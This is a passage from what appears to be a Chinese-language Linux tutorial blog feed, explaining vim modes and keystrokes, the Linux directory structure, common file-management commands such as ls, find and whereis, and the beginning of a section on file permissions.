键盘图："></a>vim 键盘图：</h2><p><img src="https://www.runoob.com/wp-content/uploads/2015/10/vi-vim-cheat-sheet-sch.gif" alt="img"></p><hr><h2 id="vi-vim-的使用"><a href="#vi-vim-的使用" class="headerlink" title="vi/vim 的使用"></a>vi/vim 的使用</h2><p>vi/vim 分为三种模式，<strong>命令模式（Command mode）</strong>，<strong>输入模式（Insert mode）</strong>和<strong>底线命令模式（Last line mode）</strong>。<br><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">命令模式</button></li><li class="tab"><button type="button" data-href="#-2">输入模式</button></li><li class="tab"><button type="button" data-href="#-3">底线命令模式</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><p>用户刚刚启动 vi/vim，便进入了命令模式。</p><p>此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</p><p>常用命令：</p><ul><li><strong>i</strong> 切换到输入模式，以输入字符。</li><li><strong>x</strong> 删除当前光标所在处的字符。</li><li><strong>:</strong> 切换到底线命令模式，以在最底一行输入命令。</li></ul><p>若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。</p><p>命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><h3 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h3><p>在命令模式下按下i就进入了输入模式。</p><p>在输入模式中，可以使用以下按键：</p><ul><li><strong>字符按键以及 <code>Shift</code> 组合</strong>，输入字符</li><li><strong>ENTER</strong>，回车键，换行</li><li><strong>BACK SPACE</strong>，退格键，删除光标前一个字符</li><li><strong>DEL</strong>，删除键，删除光标后一个字符</li><li><strong>方向键</strong>，在文本中移动光标</li><li><strong>HOME</strong>/<strong>END</strong>，移动光标到行首/行尾</li><li><strong>Page Up</strong>/<strong>Page Down</strong>，上/下翻页</li><li><strong>Insert</strong>，切换光标为输入/替换模式，光标将变成竖线/下划线</li><li><strong>ESC</strong>，退出输入模式，切换到命令模式</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><h3 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h3><p>在命令模式下按下:（英文冒号）就进入了底线命令模式。</p><p>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</p><p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p><ul><li>q 退出程序</li><li>w 保存文件</li></ul><p>按ESC键可随时退出底线命令模式。</p><p>简单的说，我们可以将这三个模式想成底下的图标来表示：</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/07/vim-vi-workmodel.png" alt="img"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></p><h2 id="vi-vim-使用实例"><a href="#vi-vim-使用实例" class="headerlink" title="vi/vim 使用实例"></a>vi/vim 使用实例</h2><h3 id="使用-vi-vim-进入一般模式"><a href="#使用-vi-vim-进入一般模式" class="headerlink" title="使用 vi/vim 进入一般模式"></a>使用 vi/vim 进入一般模式</h3><p>如果你想要使用 vi 来建立一个名为 runoob.txt 的文件时，你可以这样做：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>vim runoob.txt</span><br></pre></td></tr></table></figure><p>直接输入 <strong>vi 文件名</strong> 就能够进入 vi 的一般模式了。请注意，记得 vi 后面一定要加文件名，不管该文件存在与否！</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/07/078207F0-B204-4464-AAEF-982F45EDDAE9.jpg" alt="img"></p><h3 id="按下-i-进入输入模式-也称为编辑模式-，开始编辑文字"><a href="#按下-i-进入输入模式-也称为编辑模式-，开始编辑文字" class="headerlink" title="按下 i 进入输入模式(也称为编辑模式)，开始编辑文字"></a>按下 i 进入输入模式(也称为编辑模式)，开始编辑文字</h3><p>在一般模式之中，只要按下 i, o, a 等字符就可以进入输入模式了！</p><p>在编辑模式当中，你可以发现在左下角状态栏中会出现 –INSERT- 的字样，那就是可以输入任意字符的提示。</p><p>这个时候，键盘上除了 <strong>Esc</strong> 这个按键之外，其他的按键都可以视作为一般的输入按钮了，所以你可以进行任何的编辑。</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/07/1C928383-471E-4AF1-A61E-9E2CCBD5A913.jpg" alt="img"></p><h3 id="按下-ESC-按钮回到一般模式"><a href="#按下-ESC-按钮回到一般模式" class="headerlink" title="按下 ESC 按钮回到一般模式"></a>按下 ESC 按钮回到一般模式</h3><p>好了，假设我已经按照上面的样式给他编辑完毕了，那么应该要如何退出呢？是的！没错！就是给他按下 <strong>Esc</strong> 这个按钮即可！马上你就会发现画面左下角的 – INSERT – 不见了！</p><h3 id="在一般模式中按下-wq-储存后离开-vi"><a href="#在一般模式中按下-wq-储存后离开-vi" class="headerlink" title="在一般模式中按下 :wq 储存后离开 vi"></a>在一般模式中按下 <strong>:wq</strong> 储存后离开 vi</h3><p>OK，我们要存档了，存盘并离开的指令很简单，输入 <strong>:wq</strong> 即可保存离开！</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/07/B2FB5146-327C-4019-AC96-DD7A8EE7460C.jpg" alt="img"></p><p>OK! 这样我们就成功创建了一个 runoob.txt 的文件。</p><hr><h2 id="vi-vim-按键说明"><a href="#vi-vim-按键说明" class="headerlink" title="vi/vim 按键说明"></a>vi/vim 按键说明</h2><p>除了上面简易范例的 i, Esc, :wq 之外，其实 vim 还有非常多的按键可以使用。</p><h3 id="第一部分：一般模式可用的光标移动、复制粘贴、搜索替换等"><a href="#第一部分：一般模式可用的光标移动、复制粘贴、搜索替换等" class="headerlink" title="第一部分：一般模式可用的光标移动、复制粘贴、搜索替换等"></a>第一部分：一般模式可用的光标移动、复制粘贴、搜索替换等</h3><div class="table-container"><table><thead><tr><th>移动光标的方法</th><th></th></tr></thead><tbody><tr><td>h 或 向左箭头键(←)</td><td>光标向左移动一个字符</td></tr><tr><td>j 或 向下箭头键(↓)</td><td>光标向下移动一个字符</td></tr><tr><td>k 或 向上箭头键(↑)</td><td>光标向上移动一个字符</td></tr><tr><td>l 或 向右箭头键(→)</td><td>光标向右移动一个字符</td></tr><tr><td>如果你将右手放在键盘上的话，你会发现 hjkl 是排列在一起的，因此可以使用这四个按钮来移动光标。 如果想要进行多次移动的话，例如向下移动 30 行，可以使用 “30j” 或 “30↓” 的组合按键， 亦即加上想要进行的次数(数字)后，按下动作即可！</td><td></td></tr><tr><td>[Ctrl] + [f]</td><td>屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)</td></tr><tr><td>[Ctrl] + [b]</td><td>屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)</td></tr><tr><td>[Ctrl] + [d]</td><td>屏幕『向下』移动半页</td></tr><tr><td>[Ctrl] + [u]</td><td>屏幕『向上』移动半页</td></tr><tr><td>+</td><td>光标移动到非空格符的下一行</td></tr><tr><td>-</td><td>光标移动到非空格符的上一行</td></tr><tr><td>n<space></td><td>那个 n 表示『数字』，例如 20 。按下数字后再按空格键，光标会向右移动这一行的 n 个字符。例如 20<space> 则光标会向后面移动 20 个字符距离。</td></tr><tr><td>0 或功能键[Home]</td><td>这是数字『 0 』：移动到这一行的最前面字符处 (常用)</td></tr><tr><td>$ 或功能键[End]</td><td>移动到这一行的最后面字符处(常用)</td></tr><tr><td>H</td><td>光标移动到这个屏幕的最上方那一行的第一个字符</td></tr><tr><td>M</td><td>光标移动到这个屏幕的中央那一行的第一个字符</td></tr><tr><td>L</td><td>光标移动到这个屏幕的最下方那一行的第一个字符</td></tr><tr><td>G</td><td>移动到这个档案的最后一行(常用)</td></tr><tr><td>nG</td><td>n 为数字。移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu)</td></tr><tr><td>gg</td><td>移动到这个档案的第一行，相当于 1G 啊！ (常用)</td></tr><tr><td>n<Enter></td><td>n 为数字。光标向下移动 n 行(常用)</td></tr><tr><td>搜索替换</td><td></td></tr><tr><td>/word</td><td>向光标之下寻找一个名称为 word 的字符串。例如要在档案内搜寻 vbird 这个字符串，就输入 /vbird 即可！ (常用)</td></tr><tr><td>?word</td><td>向光标之上寻找一个字符串名称为 word 的字符串。</td></tr><tr><td>n</td><td>这个 n 是英文按键。代表重复前一个搜寻的动作。举例来说， 如果刚刚我们执行 /vbird 去向下搜寻 vbird 这个字符串，则按下 n 后，会向下继续搜寻下一个名称为 vbird 的字符串。如果是执行 ?vbird 的话，那么按下 n 则会向上继续搜寻名称为 vbird 的字符串！</td></tr><tr><td>N</td><td>这个 N 是英文按键。与 n 刚好相反，为『反向』进行前一个搜寻动作。 例如 /vbird 后，按下 N 则表示『向上』搜寻 vbird 。</td></tr><tr><td>使用 /word 配合 n 及 N 是非常有帮助的！可以让你重复的找到一些你搜寻的关键词！</td><td></td></tr><tr><td>:n1,n2s/word1/word2/g</td><td>n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2 ！举例来说，在 100 到 200 行之间搜寻 vbird 并取代为 VBIRD 则： 『:100,200s/vbird/VBIRD/g』。(常用)</td></tr><tr><td>:1,$s/word1/word2/g 或 :%s/word1/word2/g</td><td>从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！(常用)</td></tr><tr><td>:1,$s/word1/word2/gc 或 :%s/word1/word2/gc</td><td>从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用)</td></tr><tr><td>删除、复制与贴上</td><td></td></tr><tr><td>x, X</td><td>在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于 [backspace] 亦即是退格键) (常用)</td></tr><tr><td>nx</td><td>n 为数字，连续向后删除 n 个字符。举例来说，我要连续删除 10 个字符， 『10x』。</td></tr><tr><td>dd</td><td>剪切游标所在的那一整行(常用)，用 p/P 可以粘贴。</td></tr><tr><td>ndd</td><td>n 为数字。剪切光标所在的向下 n 行，例如 20dd 则是剪切 20 行(常用)，用 p/P 可以粘贴。</td></tr><tr><td>d1G</td><td>删除光标所在到第一行的所有数据</td></tr><tr><td>dG</td><td>删除光标所在到最后一行的所有数据</td></tr><tr><td>d$</td><td>删除游标所在处，到该行的最后一个字符</td></tr><tr><td>d0</td><td>那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符</td></tr><tr><td>yy</td><td>复制游标所在的那一行(常用)</td></tr><tr><td>nyy</td><td>n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行(常用)</td></tr><tr><td>y1G</td><td>复制游标所在行到第一行的所有数据</td></tr><tr><td>yG</td><td>复制游标所在行到最后一行的所有数据</td></tr><tr><td>y0</td><td>复制光标所在的那个字符到该行行首的所有数据</td></tr><tr><td>y$</td><td>复制光标所在的那个字符到该行行尾的所有数据</td></tr><tr><td>p, P</td><td>p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！ 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 (常用)</td></tr><tr><td>J</td><td>将光标所在行与下一行的数据结合成同一行</td></tr><tr><td>c</td><td>重复删除多个数据，例如向下删除 10 行，[ 10cj ]</td></tr><tr><td>u</td><td>复原前一个动作。(常用)</td></tr><tr><td>[Ctrl]+r</td><td>重做上一个动作。(常用)</td></tr><tr><td>这个 u 与 [Ctrl]+r 是很常用的指令！一个是复原，另一个则是重做一次～ 利用这两个功能按键，你的编辑，嘿嘿！很快乐的啦！</td><td></td></tr><tr><td>.</td><td>不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用)</td></tr></tbody></table></div><p>显示详细信息</p><h3 id="第二部分：一般模式切换到编辑模式的可用的按钮说明"><a href="#第二部分：一般模式切换到编辑模式的可用的按钮说明" class="headerlink" title="第二部分：一般模式切换到编辑模式的可用的按钮说明"></a>第二部分：一般模式切换到编辑模式的可用的按钮说明</h3><div class="table-container"><table><thead><tr><th>进入输入或取代的编辑模式</th><th></th></tr></thead><tbody><tr><td>i, I</td><td>进入输入模式(Insert mode)： i 为『从目前光标所在处输入』， I 为『在目前所在行的第一个非空格符处开始输入』。 (常用)</td></tr><tr><td>a, A</td><td>进入输入模式(Insert mode)： a 为『从目前光标所在的下一个字符处开始输入』， A 为『从光标所在行的最后一个字符处开始输入』。(常用)</td></tr><tr><td>o, O</td><td>进入输入模式(Insert mode)： 这是英文字母 o 的大小写。o 为在目前光标所在的下一行处输入新的一行； O 为在目前光标所在的上一行处输入新的一行！(常用)</td></tr><tr><td>r, R</td><td>进入取代模式(Replace mode)： r 只会取代光标所在的那一个字符一次；R会一直取代光标所在的文字，直到按下 ESC 为止；(常用)</td></tr><tr><td>上面这些按键中，在 vi 画面的左下角处会出现『—INSERT—』或『—REPLACE—』的字样。 由名称就知道该动作了吧！！特别注意的是，我们上面也提过了，你想要在档案里面输入字符时， 一定要在左下角处看到 INSERT 或 REPLACE 才能输入喔！</td><td></td></tr><tr><td>[Esc]</td><td>退出编辑模式，回到一般模式中(常用)</td></tr></tbody></table></div><p>显示详细信息</p><h3 id="第三部分：一般模式切换到指令行模式的可用的按钮说明"><a href="#第三部分：一般模式切换到指令行模式的可用的按钮说明" class="headerlink" title="第三部分：一般模式切换到指令行模式的可用的按钮说明"></a>第三部分：一般模式切换到指令行模式的可用的按钮说明</h3><div class="table-container"><table><thead><tr><th>指令行的储存、离开等指令</th><th></th></tr></thead><tbody><tr><td>:w</td><td>将编辑的数据写入硬盘档案中(常用)</td></tr><tr><td>:w!</td><td>若文件属性为『只读』时，强制写入该档案。不过，到底能不能写入， 还是跟你对该档案的档案权限有关啊！</td></tr><tr><td>:q</td><td>离开 vi (常用)</td></tr><tr><td>:q!</td><td>若曾修改过档案，又不想储存，使用 ! 为强制离开不储存档案。</td></tr><tr><td>注意一下啊，那个惊叹号 (!) 在 vi 当中，常常具有『强制』的意思～</td><td></td></tr><tr><td>:wq</td><td>储存后离开，若为 :wq! 则为强制储存后离开 (常用)</td></tr><tr><td>ZZ</td><td>这是大写的 Z 喔！如果修改过，保存当前文件，然后退出！效果等同于(保存并退出)</td></tr><tr><td>ZQ</td><td>不保存，强制退出。效果等同于 :q!。</td></tr><tr><td>:w [filename]</td><td>将编辑的数据储存成另一个档案（类似另存新档）</td></tr><tr><td>:r [filename]</td><td>在编辑的数据中，读入另一个档案的数据。亦即将 『filename』 这个档案内容加到游标所在行后面</td></tr><tr><td>:n1,n2 w [filename]</td><td>将 n1 到 n2 的内容储存成 filename 这个档案。</td></tr><tr><td>:! command</td><td>暂时离开 vi 到指令行模式下执行 command 的显示结果！例如 『:! ls /home』即可在 vi 当中察看 /home 底下以 ls 输出的档案信息！</td></tr><tr><td>vim 环境的变更</td><td></td></tr><tr><td>:set nu</td><td>显示行号，设定之后，会在每一行的前缀显示该行的行号</td></tr><tr><td>:set nonu</td><td>与 set nu 相反，为取消行号！</td></tr></tbody></table></div><p>显示详细信息</p><p>特别注意，在 vi/vim 中，数字是很有意义的！数字通常代表重复做几次的意思！ 也有可能是代表去到第几个什么什么的意思。</p><p>举例来说，要删除 50 行，则是用 『50dd』 对吧！ 数字加在动作之前，如我要向下移动 20 行呢？那就是『20j』或者是『20↓』即可。</p>]]></content>
      
      
      <categories>
          
          <category> Linux 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-常用文件管理命令</title>
      <link href="/post/4806ba3e.html/"/>
      <url>/post/4806ba3e.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件管理命令"><a href="#文件管理命令" class="headerlink" title="文件管理命令"></a>文件管理命令</h1><h2 id="1-概论"><a href="#1-概论" class="headerlink" title="1. 概论"></a>1. 概论</h2><p>(1).目标: 锻炼动手能力。学完以后可以做出什么项目。</p><p>(2). 什么是  <strong>Linux，Ubuntu</strong></p><p>(3). 未来工作方式，<strong>Terminal</strong>，命令行交互方式</p><h2 id="2-文件系统"><a href="#2-文件系统" class="headerlink" title="2. 文件系统"></a>2. 文件系统</h2><h3 id="1-文件系统结构"><a href="#1-文件系统结构" class="headerlink" title="(1). 文件系统结构"></a>(1). 文件系统结构</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/4_20.png" alt="img"></p><p><strong>树状目录结构：</strong></p><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg" alt="img"></p><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">bin</button></li><li class="tab"><button type="button" data-href="#-2">boot</button></li><li class="tab"><button type="button" data-href="#-3">dev</button></li><li class="tab"><button type="button" data-href="#-4">etc</button></li><li class="tab"><button type="button" data-href="#-5">home</button></li><li class="tab"><button type="button" data-href="#-6">lib</button></li><li class="tab"><button type="button" data-href="#-7">proc</button></li><li class="tab"><button type="button" data-href="#-8">root</button></li><li class="tab"><button type="button" data-href="#-9">tmp</button></li><li class="tab"><button type="button" data-href="#-10">usr</button></li><li class="tab"><button type="button" data-href="#-11">var</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><ul><li><strong>/bin</strong>：<br>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</li></ul><blockquote><p><strong>/bin, /sbin, /usr/bin, /usr/sbin</strong>: 这是系统预设的执行文件的放置目录，比如 <strong>ls</strong> 就是在 <strong>/bin/ls</strong> 目录下的。</p><p><strong>/bin</strong>、<strong>/usr/bin</strong> 是给系统用户使用的指令（除 root 外的通用用户），而/sbin, /usr/sbin 则是给 root 使用的指令。</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><ul><li><strong>/boot：</strong><br>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><ul><li><strong>/dev ：</strong><br>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-4"><ul><li><strong>/etc：</strong><br>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。如果更改了该目录下的某个文件可能会导致系统不能启动。</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-5"><ul><li><strong>/home</strong>：<br>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-6"><ul><li><strong>/lib</strong>：<br>lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-7"><ul><li><p><strong>/proc</strong>：<br>proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-8"><ul><li><strong>/root</strong>：<br>该目录为系统管理员，也称作超级权限者的用户主目录。</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-9"><ul><li><strong>/tmp</strong>：<br>tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-10"><ul><li><p><strong>/usr</strong>：<br> usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。</p></li><li><p><strong>/usr/bin：</strong><br>系统用户使用的应用程序。</p></li><li><strong>/usr/sbin：</strong><br>超级用户使用的比较高级的管理程序和系统守护程序。</li><li><strong>/usr/src：</strong><br>内核源代码默认的放置目录。</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-11"><ul><li><strong>/var</strong>：<br>var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。<blockquote><p>这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在 /var/log 目录下，另外 mail 的预设放置也是在这里。</p></blockquote></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="2-路径"><a href="#2-路径" class="headerlink" title="(2). 路径"></a>(2). 路径</h3><ul><li><p><strong>a. 绝对路径:</strong> 从根目录<code>/</code>开始描述的路径，<code>pwd</code> 输出的是绝对路径</p></li><li><p><strong>b. 相对路径:</strong> 相对路径是某个从某 文件到达另一个文件的路径</p></li><li><p><strong>c. 根目录</strong></p></li></ul><blockquote><p><code>.</code>  表示当前目录<br><code>..</code> 表示上一个目录<br><code>~/</code> 表示家目录<br>Ctrl + Insert 复制<br>Shift + Insert 粘贴</p></blockquote><h2 id="3-文件管理常用指令"><a href="#3-文件管理常用指令" class="headerlink" title="3. 文件管理常用指令"></a>3. 文件管理常用指令</h2><div class="table-container"><table><thead><tr><th>名称</th><th>英文全拼 / 参数</th><th>作用</th></tr></thead><tbody><tr><td><strong>ls</strong></td><td>list files</td><td>列出目录及文件名</td></tr><tr><td></td><td><strong>ls -l (h)(a)</strong></td><td>看文件的详细信息</td></tr><tr><td></td><td><strong>ls -a (all)</strong></td><td>全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来</td></tr><tr><td><strong>cd</strong></td><td>change directory</td><td>切换目录 (加相对路径  或者 绝对路径)</td></tr><tr><td><strong>pwd</strong></td><td>print work directory</td><td>显示目前的目录</td></tr><tr><td><strong>mkdir [目录名]</strong></td><td>make directory</td><td>创建一个新的目录</td></tr><tr><td><strong>touch [文件名]</strong></td><td></td><td>创建一个文件</td></tr><tr><td><strong>rmdir</strong></td><td>remove directory</td><td>删除一个空的目录</td></tr><tr><td><strong>rm [文件名]</strong></td><td>remove(<strong>-rf</strong>)</td><td>删除文件或目录</td></tr><tr><td><strong>cp [文件名]</strong></td><td>copy file</td><td>复制文件或目录 (复制 + 粘贴 + 重命名)</td></tr><tr><td><strong>mv [文件名]</strong></td><td>move file</td><td>移动文件与目录，或修改文件与目录的名称</td></tr><tr><td><strong>find [目录名]</strong></td><td></td><td>查看此目录的结构</td></tr><tr><td><strong>whereis &lt;程序名称&gt;</strong></td><td></td><td>查找软件的安装路径</td></tr><tr><td><strong>cat [文件名]</strong></td><td></td><td>查看此文件的内容</td></tr></tbody></table></div><blockquote><p><code>Crtl+C</code> ：向当前命令传一个终止命令 ，结束命令 换一行<br><code>Crtl+U</code> ：清空本行<br><code>[command] |more</code>: 分页查看</p></blockquote><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">whereis</button></li><li class="tab"><button type="button" data-href="#-2">find</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><blockquote><p><strong><code>whereis</code> &lt;程序名称&gt;<br>查找软件的安装路径<br>-b 只查找二进制文件<br>-m 只查找帮助文件<br>-s 只查找源代码<br>-u 排除指定类型文件<br>-f 只显示文件名<br>-B &lt;目录&gt; 在指定目录下查找二进制文件<br>-M &lt;目录&gt; 在指定目录下查找帮助文件<br>-S &lt;目录&gt; 在指定目录下查找源代码</strong></p></blockquote><p>示例：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost Desktop]<span class="comment"># whereis mysql</span></span><br><span class="line">mysql: <span class="regexp">/usr/</span>bin<span class="regexp">/mysql /u</span>sr<span class="regexp">/lib64/my</span>sql <span class="regexp">/usr/i</span>nclude<span class="regexp">/mysql /u</span>sr<span class="regexp">/share/my</span>sql <span class="regexp">/usr/</span>share<span class="regexp">/man/m</span>an1/mysql.<span class="number">1</span>.gz</span><br></pre></td></tr></table></figure></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><blockquote><p><strong><code>find</code> [路径] &lt;表达式&gt;<br>查找文件<br>-name &lt;表达式&gt; 根据文件名查找文件<br>-iname &lt;表达式&gt; 根据文件名查找文件，忽略大小写<br>-path &lt;表达式&gt; 根据路径查找文件<br>-ipath &lt;表达式&gt; 根据路径查找文件，忽略大小写<br>-amin &lt;分钟&gt; 过去N分钟内访问过的文件<br>-atime &lt;天数&gt; 过去N天内访问过的文件<br>-cmin &lt;分钟&gt; 过去N分钟内修改过的文件<br>-ctime &lt;天数&gt; 过去N天内修改过的文件<br>-anewer &lt;参照文件&gt; 比参照文件更晚被读取过的文件<br>-cnewer &lt;参照文件&gt; 比参照文件更晚被修改过的文件<br>-size &lt;大小&gt; 根据文件大小查找文件，单位b c w k M G<br>-type &lt;文件类型&gt; 根据文件类型查找文件。b 块设备 c 字符设备 d 目录 p 管道文件 f 普通文件 l 链接 s 端口文件<br>-user &lt;用户名&gt; 按归属用户查找文件<br>-uid <uid> 按UID查找文件<br>-group &lt;群组名&gt; 按归属群组查找文件<br>-gid <gid> 按GID查找文件<br>-empty 查找空文件</strong></p></blockquote><p><strong>示例 ：</strong></p><p>精确查找：</p><p><code>find / -name httpd.conf</code>   查找系统下名字为httpd.conf的文件；</p><p>模糊查找：</p><p><code>find /etc -name &#39;*srm*&#39;</code>  系统将在/etc整个目录中查找所有的包含有srm这3个字母的文件，比如absrmyz，tibc.<strong>srm等等符合条件的文件都能显示出来</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="Linux-文件基本属性"><a href="#Linux-文件基本属性" class="headerlink" title="Linux 文件基本属性"></a>Linux 文件基本属性</h1><p>Linux 系统是一种典型的多用户系统，不同的用户处于不同的地位，拥有不同的权限。</p><p>为了保护系统的安全性，Linux 系统对不同的用户访问同一文件（包括目录文件）的权限做了不同的规定。</p><p>在 Linux 中我们通常使用以下两个命令来修改文件或目录的所属用户与权限：</p><ul><li>chown (change owner) ： 修改所属用户与组。</li><li>chmod (change mode) ： 修改用户的权限。</li></ul><p>下图中通过 chown 来授权用户，通过 chmod 为用户设置可以开门的权限。</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/1_151733904241.png" alt="img"></p><p>在 Linux 中我们可以使用 ll 或者 ls –l 命令来显示一个文件的属性以及文件所属的用户和组，如：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@www /]<span class="comment"># ls -l</span></span><br><span class="line">total 64</span><br><span class="line">dr-xr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Dec<span class="number"> 14 </span><span class="number"> 2012 </span>bin</span><br><span class="line">dr-xr-xr-x  <span class="number"> 4 </span>root root<span class="number"> 4096 </span>Apr<span class="number"> 19 </span><span class="number"> 2012 </span>boot</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>实例中，<strong>bin</strong> 文件的第一个属性用 d 表示。d 在 Linux 中代表该文件是一个目录文件。</p><p>在 Linux 中第一个字符代表这个文件是目录、文件或链接文件等等。</p><ul><li>当为 d 则是目录</li><li>当为 - 则是文件；</li><li>若是 l 则表示为链接文档(link file)；</li><li>若是 b 则表示为装置文件里面的可供储存的接口设备(可随机存取装置)；</li><li>若是 c 则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置)。</li></ul><p>接下来的字符中，以三个为一组，且均为 rwx 的三个参数的组合。其中， <strong>r 代表可读(read)、 w 代表可写(write)、 x 代表可执行(execute)</strong>。 要注意的是，这三个权限的位置不会改变，<strong>如果没有权限，就会出现减号 - 